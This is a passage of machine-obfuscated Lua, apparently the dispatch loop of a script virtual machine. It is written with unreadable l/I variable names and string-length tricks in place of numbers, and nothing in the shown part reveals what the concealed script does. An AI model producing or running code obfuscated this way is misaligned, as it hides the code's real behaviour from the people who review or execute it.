lI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Us")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("akY")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("GgF3")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5o")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kzg")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("23")];btwbaby_llIlIIIl=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hC8")]];btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]=btwbaby_llIlIIIl;btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llIlIIIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("FP7p")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{47;522;751;271};}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Cej")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AF")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Irm")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jn")]btwbaby_IIIlIlIIIIlllllIlIlIIlI,btwbaby_llIIIlIlllll=btwbaby_lIllllllIIllIIlIll(btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]))btwbaby_lIlIIllIllIlIIlI=btwbaby_llIIIlIlllll+btwbaby_IIlIllIIlIlIIlIIIl-1 btwbaby_lIIIlIIIIllllIlIllllI=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIlIllIIlIlIIlIIIl,btwbaby_lIlIIllIllIlIIlI do btwbaby_lIIIlIIIIllllIlIllllI=btwbaby_lIIIlIIIIllllIlIllllI+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_IIIlIlIIIIlllllIlIlIIlI[btwbaby_lIIIlIIIIllllIlIllllI];end;btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ix")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_lIlIIllIllIlIIlI))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("62")]]={};btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{750;477;787;559};{105;533;947;846};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("JqT")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("oUYu")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zM")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("89o")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7c")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("X7p")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{343;928;401;802};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Z9")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("eMx")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("S2UJ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Vh")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("scM")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("uo")];btwbaby_llIlIIIl=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ibr")]];btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]=btwbaby_llIlIIIl;btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llIlIIIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vPnt")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{135;116;909;212};"1 + 1 = 111";}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("HKG")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{611;263;22;960};{573;696;74;336};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ayj")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("7t")]btwbaby_IIIlIlIIIIlllllIlIlIIlI,btwbaby_llIIIlIlllll=btwbaby_lIllllllIIllIIlIll(btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]))btwbaby_lIlIIllIllIlIIlI=btwbaby_llIIIlIlllll+btwbaby_IIlIllIIlIlIIlIIIl-1 btwbaby_lIIIlIIIIllllIlIllllI=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIlIllIIlIlIIlIIIl,btwbaby_lIlIIllIllIlIIlI do btwbaby_lIIIlIIIIllllIlIllllI=btwbaby_lIIIlIIIIllllIlIllllI+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_IIIlIlIIIIlllllIlIlIIlI[btwbaby_lIIIlIIIIllllIlIllllI];end;btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{65;234;823;179};{399;653;288;713};}]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_lIlIIllIllIlIIlI))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{553;144;533;407};"1 + 1 = 111";"1 + 1 = 111";}];end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("coYnyPSQ6oRqKm6Hzr4LlC9")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("OFLxDADgfftHhLavvzn")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("kQHlOpYp0AoLp9K3e")then if btwbaby_IIlIllIIlIlIIlIIIl==#("nGVKkE3AzXrJpXoB")then btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("CFB")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zY")]];else local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Yk")]btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IllIIIllIlIIIIIlIIIllII+1,btwbaby_lIlIIllIllIlIIlI))end;elseif btwbaby_IIlIllIIlIlIIlIIIl>#("77zTmMmqQ1Tqhbgq9l")then local btwbaby_IllIIlllIIIIlIllIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("5D")];local btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("i55v")];local btwbaby_IIIllIlIIlI=btwbaby_IllIIlllIIIIlIllIl+2 local btwbaby_IllIIlllIIIIlIllIl={btwbaby_llllIllI[btwbaby_IllIIlllIIIIlIllIl](btwbaby_llllIllI[btwbaby_IllIIlllIIIIlIllIl+1],btwbaby_llllIllI[btwbaby_IIIllIlIIlI])};for btwbaby_IllIIIllIlIIIIIlIIIllII=1,btwbaby_lIIlIlIIlIlIl do btwbaby_llllIllI[btwbaby_IIIllIlIIlI+btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII];end;local btwbaby_IllIIlllIIIIlIllIl=btwbaby_IllIIlllIIIIlIllIl[1]if btwbaby_IllIIlllIIIIlIllIl then btwbaby_llllIllI[btwbaby_IIIllIlIIlI]=btwbaby_IllIIlllIIIIlIllIl btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("kiD")];else btwbaby_llIIllIll=btwbaby_llIIllIll+1;end;else btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vn")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("li1")]][btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("aPtC")]]];end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("XKGdrn0a8qkBvYuN6PNa4")then if btwbaby_IIlIllIIlIlIIlIIIl>#("tFNjiqWkspLHOeB3hFxL")then btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mK")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("R4R")]];else btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("6y")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("QVP")];end;elseif btwbaby_IIlIllIIlIlIIlIIIl==#("9FAxDWzkLxlXopaAieJoY8")then if(btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]~=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}])then btwbaby_llIIllIll=btwbaby_llIIllIll+1;else btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("8CW")];end;else local btwbaby_IIlIllIIlIlIIlIIIl;local btwbaby_lllIllIIlIlIlIllIIIIIIIII;local btwbaby_llIlIIIl,btwbaby_llIIIlIlllll;local btwbaby_lIIIlIIIIllllIlIllllI;local btwbaby_IIlIllIIlIlIIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("U3")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("EX8")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9a")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("XlW")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("vC")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("CMX")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("M4")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("MBq")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Nfmc")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{335;317;678;210};"1 + 1 = 111";}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jhf")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("77")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("TRU")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("daTn")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("fz")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{909;298;895;689};"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("UR")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("NMV")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uJ")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{711;844;763;705};{428;808;310;290};{894;12;121;531};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7a")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jdx")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("9P")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{273;857;572;121};"1 + 1 = 111";}]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cP")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{172;485;721;123};{581;309;495;829};{366;941;131;220};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ov5M")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eY")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Fo9")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("QJ")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vyQ")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZBNP")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{261;553;828;584};{544;189;352;800};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("d2S")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("tZD7")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Rx")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("XDj")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Vu9Y")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("u8")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("0Xf")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{355;405;168;548};"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hr")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("T3q")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("va")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ufc")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("pDlW")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dP")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("tP9")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uy")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("VjY")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xM")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("N4O")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("rW")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("x4t")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("p3")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("unm")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("imSn")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("XA")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("4Ho")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("PURt")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("VU")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("YtF")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("aZF7")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9N")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("8Dg")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YNpc")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rN")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vaD")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{55;297;806;362};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("35z")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Sa4j")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8Q")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("PWm")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Tb")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("iWm")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Su")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("K9k")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("JM")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("2jU")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eA")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("BQ8")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5Ut9")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ye")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Onz")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("xp1i")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Yy7")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7L")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("B4y")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nd")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZIn")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 